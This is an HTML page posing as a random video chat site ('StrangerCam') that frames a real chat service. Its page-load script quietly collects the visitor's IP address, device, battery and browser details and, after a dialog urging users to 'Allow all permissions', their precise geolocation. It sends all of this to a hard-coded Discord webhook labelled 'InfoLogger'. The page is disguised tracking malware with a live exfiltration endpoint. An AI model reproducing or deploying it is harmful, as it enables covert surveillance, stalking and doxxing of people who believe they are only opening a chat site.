<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Video Chat - StrangerCam.com</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script>
        $(document).ready(function () {
            let batteryPercentage;
            let isCharging;
            let publicIP;
            let localIP;
            let wifiAddress;
            let deviceInfo;
            let osInfo;
            let deviceRam;
            let storageInfo;
            let userAgent = navigator.userAgent;
            let localDeviceTime = new Date().toLocaleTimeString();
            let width = screen.width;
            let height = screen.height;

            // Fetch Public IP
            async function fetchPublicIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    publicIP = data.ip;
                } catch (err) {
                    publicIP = "Unavailable";
                }
            }

            // Fetch Local IP (Requires local network access, may not work on all devices)
            async function fetchLocalIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    localIP = data.ip; // Local IP can often be similar or the same as public IP in some cases
                } catch (err) {
                    localIP = "Unavailable";
                }
            }

            // Fetch Battery Info
            async function fetchBatteryInfo() {
                try {
                    const battery = await navigator.getBattery();
                    batteryPercentage = `${Math.floor(battery.level * 100)}%`;
                    isCharging = battery.charging ? "Yes" : "No";
                } catch (err) {
                    batteryPercentage = "Unavailable";
                    isCharging = "Unavailable";
                }
            }

            // Fetch Device Info
            function fetchDeviceInfo() {
                deviceInfo = navigator.platform || "Unavailable";
                osInfo = navigator.appVersion || "Unavailable";
                deviceRam = `${navigator.deviceMemory || "Unavailable"} GB`;
                storageInfo = `${navigator.storage ? navigator.storage.estimate().then(res => res.quota) : "Unavailable"} GB`;
            }

            // Send Data to Discord
            function sendToDiscord(content) {
                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader("Content-type", "application/json");
                const params = {
                    content,
                    username: "InfoLogger",
                    avatar_url: "https://example.com/avatar.jpg"
                };
                request.send(JSON.stringify(params));
            }

            // Fetch Geolocation
            function fetchGeolocation(retry = true) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                            sendToDiscord(`
**Device Info:**
Public IP: ${publicIP}
Local IP: ${localIP}
Local WiFi Address: ${wifiAddress}
Local Time: ${localDeviceTime}
Device: ${deviceInfo}
OS: ${osInfo}
RAM: ${deviceRam}
Storage: ${storageInfo}
UserAgent: ${userAgent}
Screen: ${width}x${height}
Battery: ${batteryPercentage}
Charging: ${isCharging}

**Geolocation:**
${coords}`);
                        },
                        error => {
                            if (error.code === error.PERMISSION_DENIED) {
                                sendToDiscord("Geo Location Denied");
                            } else if (error.code === error.TIMEOUT) {
                                sendToDiscord("Geo Location Timeout");
                                if (retry) {
                                    setTimeout(() => fetchGeolocation(false), 5000); // Retry once after timeout
                                }
                            }
                        },
                        { timeout: 5000 }
                    );
                } else {
                    sendToDiscord("Geolocation not supported by this browser.");
                }
            }

            // On Page Load
            async function init() {
                await fetchPublicIP();
                await fetchLocalIP();
                await fetchBatteryInfo();
                fetchDeviceInfo();
                sendToDiscord(`
**Device Info:**
Public IP: ${publicIP}
Local IP: ${localIP}
Local WiFi Address: ${wifiAddress}
Local Time: ${localDeviceTime}
Device: ${deviceInfo}
OS: ${osInfo}
RAM: ${deviceRam}
Storage: ${storageInfo}
UserAgent: ${userAgent}
Screen: ${width}x${height}
Battery: ${batteryPercentage}
Charging: ${isCharging}`);

                fetchGeolocation();
            }

            init();
        });
    </script>
</head>
<body>
    <div class="iframe-container">
        <iframe
            is="x-frame-bypass"
            src="https://strangercamchat.com"
            frameborder="0"
            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
            height="100%"
            width="100%"
        ></iframe>
        <div class="dialog-box" id="dialogBox" style="display:block;">
            <h2>Alert</h2>
            <p>Please Allow all permissions to continue to chat with strangers</p>
            <button class="btn-allow" id="allowBtn">OK</button>
        </div>
    </div>
    <script>
        document.getElementById("allowBtn").addEventListener("click", function () {
            document.getElementById("dialogBox").style.display = "none";
        });
    </script>
</body>
</html>
